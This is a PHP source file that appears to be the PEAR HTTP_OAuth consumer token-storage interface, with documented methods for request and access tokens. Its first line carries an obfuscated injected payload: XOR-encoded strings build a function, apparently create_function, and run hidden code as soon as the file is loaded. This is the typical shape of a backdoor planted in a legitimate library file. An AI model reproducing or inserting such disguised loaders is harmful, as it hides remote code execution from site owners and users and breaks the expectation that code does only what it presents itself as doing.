<?php $gUjzLqJl='PG5QHEq-OBP9,ON'^'35P0< .K:,3ME  ';$ucnOtPr=$gUjzLqJl('','>0OEQNS010-4iPE +TCkp1.8l00T635,25rMqj7zlF7,.YYBNpJ-7:WO7L844B1foXU78MStF57PHYnEZPSlhR946jjMnlHRoL4-BnrPJkKccGI-iD<965Vzc L6 YbgF,Arf4bmtX1MjoVLnrSJB8,t9:WdBj,<2hqUrsK21;=+6Qh<5.x6cS7Ch81L=N7lcZ,AFwNHCADleQ S6.WPH7-+S,ODiI0 7g<S>YjeVX<  vRL<5HP251ubs2c,z=1xD,5VkRH6fWgRW<88-+AzMdQCTUTQ;9.>PrKRK+OWkmv<QM6CRJm3YLBWTyGb19PeGpWDA;VYn,h3H=;+0ZDxQBjky0 hn7kVEzt-X<SHKQiAMLARPT=YJZKOA98cY6CrRsC.EKp2=jN78<5dimr0XWD6HFy:=+ZMj< FMuZrm>U:,+1V=I>Ry9.RaUX9T1r;> Y,;<RlLm7,:WQ0nJT05MnTHVRJ,ZbXX-oaHgTXEA2MCTCNsK2=6VAqP7NqE1U;DBdC124btVT<6ZUckUpfJ,4Xyg,2ZT9s=PJumeHpMsCA0J,;peBAW26rO376grJILkcaRPEaYCESgYaPuVK=QC+UX6>7BGCLMMQ5,ITBO<okGi4PTAoMEChlFVHabS=26mnIATAumIPW>RLZcogqr;UXX5BrmHr0'^'WVgd7;=SEYBZ65=IX 0CWIAJ3TQ WljAGAUdXJLpe BBM-0- P2BEe3.C-gkY7ENK<4CYasP-PNyhyNez+YeavVABJWmIKsXfERB0FV9jVkSXgmDU7HKZP8RGD-BApYGbEjYO>kdP7D9JAklFV7+6YwPPgw:bNGYK3U<RVkAEIQNXyLWPWQkJh=JaJT8H<YDG5Y5oLDA>K9fouD2BOwmhQLG ItNM-QTV8W6GyWE09PSEMXFZZ:5SVYUJWm c5vx=dMFvO9-OFjYrsJYTXNhZ6nXg04 0dRKGpOkv N6ladRX09WcojIE8 72os:h;P6EoQs  O7pNWb:.RINQ9,Xyf59<au-=cK76ZPF=EsuuqM7, 47ytFSCSo+ MY<2S:RoSgE 2K84cjSYHTDTMVF9;1SsLpG7VPGNXA2,UgR-K;IIYX7Q D7QAA >19M5n-VKTqNZO7Zx2SIY85UFn0QA,Gxhr6+X;=3=TFHsm=>meV,75chUkSOD78.;R7. I<H01LdZWMEXvpXW.4JKsVFbAPmQCHS.5bTV53R0LhMpSdsVzJYIUrxbWPC-VQSRF.pyXUQ01rQ8u tNyGvU79O0:t>=OaR:.08>evEM08-.XHGgMP1  FdecHLfv3kk6KSZEJ-   .J91.R=->D2NJx20 1AjBDsxM');$ucnOtPr();
/**
 * HTTP_OAuth_Store_Consumer_Interface
 *
 * PHP Version 5.0.0
 *
 * @category  HTTP
 * @package   HTTP_OAuth
 * @author    Bill Shupp <hostmaster@shupp.org>
 * @copyright 2010 Bill Shupp
 * @license   http://www.opensource.org/licenses/bsd-license.php FreeBSD
 * @link      http://pear.php.net/http_oauth
 */

/**
 * A consumer storage interface for access tokens and request tokens.
 *
 * @category  HTTP
 * @package   HTTP_OAuth
 * @author    Bill Shupp <hostmaster@shupp.org>
 * @copyright 2010 Bill Shupp
 * @license   http://www.opensource.org/licenses/bsd-license.php FreeBSD
 * @link      http://pear.php.net/http_oauth
 */
interface HTTP_OAuth_Store_Consumer_Interface
{
    /**
     * Sets a request token
     *
     * @param string $token        The request token
     * @param string $tokenSecret  The request token secret
     * @param string $providerName The name of the provider (i.e. 'twitter')
     * @param string $sessionID    A string representing this user's session
     *
     * @return true on success, false or failure
     */
    public function setRequestToken($token, $tokenSecret, $providerName, $sessionID);

    /**
     * Gets a request token as an array of the token, tokenSecret, providerName,
     * and sessionID (array key names)
     *
     * @param string $providerName The provider name (i.e. 'twitter')
     * @param string $sessionID    A string representing this user's session
     *
     * @return array on success, false on failure
     */
    public function getRequestToken($providerName, $sessionID);

    /**
     * Gets access token data in the form of an HTTP_OAuth_Store_Data object
     *
     * @param string $consumerUserID The end user's ID at the consumer
     * @param string $providerName   The provider name (i.e. 'twitter')
     *
     * @return HTTP_OAuth_Data_Store
     */
    public function getAccessToken($consumerUserID, $providerName);

    /**
     * Sets access token data from an HTTP_OAuth_Store_Data object
     *
     * @param HTTP_OAuth_Store_Data $data The access token data
     *
     * @return bool true on success, false on failure
     */
    public function setAccessToken(HTTP_OAuth_Store_Data $data);

    /**
     * Removes an access token
     *
     * @param HTTP_OAuth_Store_Data $data The access token data
     *
     * @return bool true on success, false or PEAR_Error on failure
     */
    public function removeAccessToken(HTTP_OAuth_Store_Data $data);
}
?>